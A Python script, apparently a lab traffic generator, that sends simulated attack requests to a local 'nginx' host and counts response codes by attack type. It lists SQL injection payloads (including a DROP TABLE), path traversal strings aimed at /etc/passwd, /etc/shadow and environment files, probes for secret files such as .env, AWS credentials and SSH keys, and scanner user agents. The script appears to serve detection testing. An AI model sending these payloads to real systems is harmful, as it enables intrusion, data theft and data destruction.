import http.client
import random
import sys
import time
from collections import Counter

N = int(sys.argv[1]) if len(sys.argv) > 1 else 50
random.seed(43)

BROWSER_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0",
]

SCANNER_UAS = [
    "sqlmap/1.8.5#stable (https://sqlmap.org)",
    "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000001)",
    "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
    "gobuster/3.6",
    "Fuzz Faster U Fool v2.1.0",
    "Mozilla/5.0 zgrab/0.x",
    "masscan/1.3 (https://github.com/robertdavidgraham/masscan)",
    "WPScan v3.8.25 (https://wpscan.com/wordpress-security-scanner)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Nuclei",
    "python-requests/2.32.3",
    "Go-http-client/1.1",
    "curl/8.7.1",
]

SCAN_PATHS = [
    "/.env", "/.env.bak", "/.git/config", "/.git/HEAD", "/.svn/entries",
    "/admin", "/admin/login", "/administrator/", "/wp-login.php", "/wp-admin/",
    "/phpmyadmin/", "/pma/", "/backup.zip", "/backup.sql", "/db.sql",
    "/config.php", "/config.yml", "/web.config", "/.htaccess", "/.htpasswd",
    "/.aws/credentials", "/.ssh/id_rsa", "/server-status", "/actuator/env",
    "/actuator/health", "/debug", "/console", "/.DS_Store", "/api/v1/users",
    "/phpinfo.php", "/info.php", "/xmlrpc.php", "/cgi-bin/test.cgi",
]

SQLI = [
    "1'", "1\"", "1 OR 1=1", "1' OR '1'='1", "1' OR 1=1--", "1 OR 1=1--",
    "1 AND 1=2", "1 AND 1=1", "-1 UNION SELECT name FROM sqlite_master--",
    "1 UNION SELECT sql FROM sqlite_master--", "1 UNION SELECT 1,2--",
    "1; DROP TABLE products--", "1' AND SLEEP(5)--", "1 AND (SELECT 1)=1",
    "1)) OR ((1=1", "1' ORDER BY 1--", "1 ORDER BY 5--", "1' GROUP BY 1--",
    "1 OR 'a'='a'", "admin'--", "1' UNION ALL SELECT NULL--",
    "1%27%20OR%20%271%27%3D%271",            
    "1%20UNION%20SELECT%20name%20FROM%20sqlite_master--",
]

TRAVERSAL = [
    "/static/../../../../etc/passwd",
    "/static/../../../etc/shadow",
    "/static/..%2f..%2f..%2fetc%2fpasswd",
    "/static/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "/static/%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/static/%252e%252e%252fetc%252fpasswd",   
    "/static/....//....//....//etc/passwd",
    "/static/..\\..\\..\\windows\\win.ini",
    "/static/..%5c..%5c..%5cwindows%5cwin.ini",
    "/static/../../../proc/self/environ",
    "/static/..%c0%af..%c0%afetc/passwd",      
    "/static/css/../../../../etc/hosts",
    "/static/%2e%2e/%2e%2e/app/app.py",
    "/static/..;/..;/etc/passwd",
]

NORMAL_PATHS = ["/", "/products", "/product?id=3", "/search?q=book", "/login"]


def send(path, user_agent, exp_id):
    conn = http.client.HTTPConnection("nginx", 80, timeout=5)
    conn.putrequest("GET", path, skip_accept_encoding=True)  
    conn.putheader("User-Agent", user_agent)
    conn.putheader("X-Exp-Id", exp_id)
    conn.endheaders()
    status = conn.getresponse().status
    conn.close()
    return status


def sqli_path():
    payload = random.choice(SQLI).replace(" ", "%20")   
    return f"/product?id={payload}"


PLAN = [
    ("path_scan",
     lambda: random.choice(SCAN_PATHS),
     lambda: random.choice(SCANNER_UAS) if random.random() < 0.5 else random.choice(BROWSER_UAS)),
    ("sqli",
     sqli_path,
     lambda: random.choice(BROWSER_UAS) if random.random() < 0.7 else SCANNER_UAS[0]),
    ("path_traversal",
     lambda: random.choice(TRAVERSAL),
     lambda: random.choice(BROWSER_UAS)),
    ("scanner_ua",
     lambda: random.choice(NORMAL_PATHS),
     lambda: random.choice(SCANNER_UAS)),
]

stats = Counter()
i = 0
for attack_type, make_path, make_ua in PLAN:
    for _ in range(N):
        status = send(make_path(), make_ua(), f"{attack_type}:{i}")
        stats[(attack_type, status)] += 1
        i += 1
        time.sleep(random.uniform(0.01, 0.1))  
    print(f"[attack] {attack_type}: done", flush=True)

print("\n[attack] status by type:")
for (attack_type, status), count in sorted(stats.items()):
    print(f"  {attack_type:15s} {status}  x{count}")